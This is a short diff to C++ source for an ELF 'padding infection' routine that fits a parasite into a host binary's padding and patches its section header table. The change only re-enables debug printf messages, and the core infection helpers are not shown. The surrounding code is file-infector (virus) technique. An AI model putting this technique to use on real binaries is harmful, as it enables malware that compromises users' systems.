@@ -165,14 +165,14 @@ bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   ElfPaddingInfo info{};
   // Get padding size in host.
   if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
-    // printf("Cannot correctly parse host elf\n");
+    printf("Cannot correctly parse host elf\n");
     return false;
   }
 
   if (info.padding_size < parasite_mapping.size()) {
-    // printf(
-    //    "Host cannot accomodate parasite padding size: %d parasite size:
-    //    %d\n", info.padding_size, parasite_mapping.size());
+    printf(
+        "Host cannot accomodate parasite padding size: %d parasite size:%d\n",
+        info.padding_size, parasite_mapping.size());
     return false;
   }
 
@@ -182,7 +182,7 @@ bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Patch section header table to increase text section size.
   if (!patch_sht(host_mapping, parasite_mapping.size(),
                  info.code_segment_end_offset)) {
-    // printf("Failed to patch section header table\n");
+    printf("Failed to patch section header table\n");
     return false;
   }
 
